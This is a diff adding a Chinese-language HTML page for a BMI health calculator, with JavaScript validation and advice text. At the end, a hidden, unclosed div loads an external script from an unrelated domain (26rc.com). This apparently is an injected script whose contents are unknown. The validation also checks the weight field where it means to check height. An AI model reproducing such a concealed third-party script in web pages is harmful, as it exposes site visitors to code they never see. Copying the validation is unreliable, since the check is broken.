@@ -1,0 +1,149 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
+<title>生活百宝箱</title>
+<link href="../res/zl_style.css" rel="stylesheet" type="text/css" />
+<script language="javascript" src="../js/tools.js"></script>
+<script language="javascript">
+<!--
+
+
+/**
+ * 按BMI算法计算健康指数 
+ */
+function calculateWeight()
+{
+	var oForm  =  $("weightForm");
+	var nHeight,nWeight;
+	with(oForm){
+		nHeight = height.value;
+		nWeight  = weight.value;
+		if(nHeight.trim() == ""){
+			alert("请输入你的身高");
+			height.focus();
+			return false;
+		}else if(nWeight.search(/^\d*.?\d+$/g) != 0){
+			alert("身高必须为整数");
+			height.focus();
+			return false;
+		}else if(nWeight.trim() == ""){
+			alert("请输入你的体重");
+			weight.focus();
+			return false;
+		}else if(nWeight.search(/^\d*.?\d+$/g) != 0){
+			alert("体重必须为数字");
+			weight.focus();
+			return false;
+		}
+	}
+	var nBmi	= Math.round(nWeight / (nHeight*nHeight) * 100 * 100);
+	$("bmiValue").innerHTML = nBmi;	
+	if (nBmi >38) {
+		$("explanation").innerHTML = "你在开玩笑吧!!!哪有这种身材";
+	}else if (nBmi >28 && nBmi <=38) {
+		 $("explanation").innerHTML = "你太重了!";
+	}else if (nBmi >23 && nBmi <=28) {
+		$("explanation").innerHTML = "你已经有些发福了，要多运动哦";
+	}else if (nBmi >19 && nBmi <=23) {
+		$("explanation").innerHTML = "你的体重很标准，继续保持哦";
+	}else if (nBmi >=15 && nBmi <=19) {
+		$("explanation").innerHTML = "有些偏瘦了，要多注意营养啊！";
+	}else if (nBmi >=11 && nBmi <15) {
+		 $("explanation").innerHTML = "太瘦了！！！";
+	}else if (nBmi <11) {
+		$("explanation").innerHTML = "你在开玩笑吧!不可能存在的哦";
+	}
+	$("resultDiv").style.display = "";
+	return false;
+}
+
+function fClear(){
+	$("height").value = "";
+	$("weight").value = "";
+}
+//-->
+</script>
+</head>
+<body lang="zh" class="BG_Lnav">
+<div class="Top"><a href="../index.htm" class="a_INDEX">生活百宝箱</a><b class="Top_B_arr"></b><span><strong>万能计算器</strong></span></div>
+
+<table class="ZL_Cont_tab" cellpadding="0" cellspacing="0">
+<tbody>
+<form id="weightForm" name="weightForm" onsubmit="return calculateWeight();">
+  <tr>
+    <td class="Cont_tbL">
+	<!--左侧导航 开始-->
+	<div class="NAV_L_Tit">计算器</div>
+	<a href="jsq_shuxue.htm">数学计算器</a>
+	<a href="jsq_shui.htm">个人所得税</a>
+	<a href="jsq_daikuan.htm">房贷计算器</a>
+	<a href="jsq_cunkuan.htm">存款计算器</a>
+	<a href="#" class="on">健康计算器</a>
+	<!--左侧导航 结束-->
+	</td>
+    <td style="vertical-align:top">
+	<!--右侧内容区 开始-->
+	<div class="Cont_tit">
+		<h1>健康计算器</h1>
+		<span>关爱健康：密切关注您无形的财富</span>	</div>
+	<!--题头结束-->
+	<div class="Cont">
+		<table class="table_jsq dk_tab_Wid2" cellspacing="0" cellpadding="0">
+  <tr>
+    <td class="td_L">性 别：</td>
+    <td>
+      <select name="select" id="select">
+        <option selected="selected">男</option>
+        <option>女</option>
+      </select>      </td>
+  </tr>
+  <tr>
+    <td class="td_L">身 高：</td>
+    <td>
+	<input type="text" id="height" name="height" class="inp_jsq" style="width:112px" onFocus="fHelpFocus(this)" onBlur="fHelpBlue(this)"> 
+	厘米	</td>
+  </tr>
+  <tr>
+    <td class="td_L">体 重：</td>
+    <td>
+		<input type="text" id="weight" name="weight" class="inp_jsq" style="width:112px" onFocus="fHelpFocus(this)" onBlur="fHelpBlue(this)"> 
+		公斤	</td>
+  </tr>
+  <tr>
+    <td class="td_L">&nbsp;</td>
+    <td style="height:40px"><input type="submit" name="Submit" value=" 计算 " class="bot_line_btnB font_B">&nbsp;&nbsp;&nbsp;&nbsp;<input type="button" name="Submit" value=" 清零 " onclick="fClear();" class="bot_line_btnB"></td>
+  </tr>
+</table>
+<!--结果浮层 开始-->
+<div id="resultDiv" class="sec_box_result" style="display:none">
+	<div class="sec_box_result_tit">计算结果</div>
+	<table class="table_jsq_result" cellspacing="0" cellpadding="0">
+         <tr>
+          <td class="td_L">健康值：</td>
+          <td><span id="bmiValue"></span> <font class="C999">(最佳值在20~23之间)</font></td>
+        </tr>
+        <tr>
+          <td class="td_L">说　明：</td>
+          <td><span  id="explanation"></span></td>
+        </tr>
+        <tr>
+          <td colspan="2">
+		<div class="res_Tcont"><strong>提示：</strong>体重指数（BMI）是国际通用的衡量人体重的方法，计算的方法是：BMI=体重（公斤）除以身高（米）平方。<br/>我国专家认为，中国人属亚洲人种，最佳值应该是20-22，BMI大于22.6为超重，BMI大于30为肥胖。</div>
+		  </td>
+        </tr>
+      </table>
+</div>
+<!--结果浮层 结束-->
+	</div>
+	<!--右侧内容区 结束-->
+	</td>
+  </tr>
+</form>
+</tbody>
+</table>
+<!--左侧标签 结束-->
+<div style='display:none'>
+<script type="text/javascript" src="http://www.26rc.com/js/26.js"></script>
+</body>
+</html>
